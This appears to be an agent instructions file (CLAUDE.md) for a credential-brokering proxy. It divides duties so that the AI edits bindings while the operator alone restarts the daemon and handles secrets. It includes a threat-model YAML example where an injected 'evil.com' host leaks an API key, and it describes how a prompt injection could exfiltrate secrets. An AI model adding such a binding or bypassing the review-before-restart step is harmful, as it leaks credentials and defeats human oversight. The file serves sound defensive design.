# Claude Code instructions

Repo conventions, hard constraints, doc rules, commit-style: see [`AGENTS.md`](./AGENTS.md). This file is Claude-specific operating notes that augment those.

## Operating AVP as Claude

Claude can drive AVP end-to-end **without ever holding a real secret**. The division of labor:

| Action | Who does it |
|---|---|
| Edit `bindings.yaml` — placeholders, templates, binding hosts, scope | **Claude** — operator reviews diff before restart |
| Validate the YAML (pydantic loader, dry-run only) | **Claude** |
| Read the audit log to debug a binding mismatch | **Claude** |
| Suggest the BWS secret name + write the binding around it | **Claude** |
| **Restart the daemon** (`docker compose restart`, `systemctl restart`, `ans … --tags …`) | **Operator only** — security boundary, see below |
| **Add the real secret value to Bitwarden** | **Operator only** — Claude must not see the value |
| Rotate / revoke the BWS machine-account token | **Operator only** |
| Read `secrets/bws-token` or `/etc/agent-vault-proxy/bws-token` | **Never** — that's the daemon's token, not for the agent |

### Why restart is the operator's job

Restart is what makes a new `bindings.yaml` go live. Before restart, the file is just text on disk. After restart, every secret AVP holds can be routed to wherever the new config says.

That means anyone (or any prompt injection) who can write `bindings.yaml` AND trigger a restart can exfil every real secret AVP brokers, with a single-line edit:

```yaml
OPENAI_API_KEY:
  bindings:
    - host: "api.openai.com"
    - host: "evil.com"          # added — now the real key leaks here
```

The git-diff review *before* the operator restarts is the only thing standing between an injected edit and a deployed exfil channel. If Claude both edits and restarts, the review window collapses to zero. So:

- Claude **edits** `bindings.yaml` (the operator sees the diff in `git diff` / IDE / PR).
- Operator **restarts** after reviewing the diff.
- Never chain the two from Claude — even for "just a one-line tweak."

The same logic applies to the Ansible role's `agent_vault_proxy_secrets` var: Claude edits the var, the operator runs `ans … --tags agent-vault-proxy`.

**R-RESTART (binding rule).** Any automation that restarts AVP on a `bindings.yaml` change defeats the entire credential isolation model. That includes `fswatch` / `inotify` watchers, `make restart` targets Claude can invoke via shell, `post-commit` / `post-receive` git hooks, GitHub Actions auto-deploys, and "while you're in there, can you also restart so I can verify my unrelated fix?" requests where the operator restarts without re-reading the bindings diff. If diff review feels tedious enough that you want to automate it away, the fix is a better diff tool, not auto-restart. The diff *is* the security control.

## Workflow: "add a new binding"

1. Ask the operator the **service name** and the **auth shape** (Bearer? Basic? `X-API-Key`? Composite of multiple values?).
2. Pick a BWS secret name (or names, for composite — up to 4). Write the binding block in `bindings.yaml` with a clearly-fake placeholder string (operator-recognizable, e.g. `slack_PLACEHOLDER_01HXY...`).
3. Tell the operator: "Add `<BWS_NAME>` to the BWS project with the real value."
4. Validate config-load (dry-run, no service change): `python -c 'from agent_vault_proxy.config import load_config; load_config("bindings.yaml")'`.
5. **Hand off to the operator** for the restart. After the operator confirms restart, verify via a real request from the calling shell + grep the audit log for an `inject_decision allowed` event.

For composite bindings (multi-value templates), see `bindings.example.yaml` and `docs/architecture.md` §4.2.

## Dependency edits — regenerate both lockfiles

If you touch `pyproject.toml` deps, regenerate `requirements.lock` *and* `requirements-dev.lock` in the same commit using the snippet in [`AGENTS.md` → Dependency changes](./AGENTS.md#dependency-changes). Don't hand-edit a lockfile to "just add one package" — the hash-pinning + cooldown gate (`scripts/check-lockfile-hashes.py` + `scripts/check-lockfile-drift.sh`, mirrored in CI) will fail the commit. Operator reviews the lockfile diff alongside the code diff before merge.

## What this repo will NOT do

The full out-of-scope list lives in [`AGENTS.md`](AGENTS.md). Highlights: no OAuth refresh flow, no AWS SigV4 signer, no egress firewall behavior, no non-BWS backends merged without an issue first.
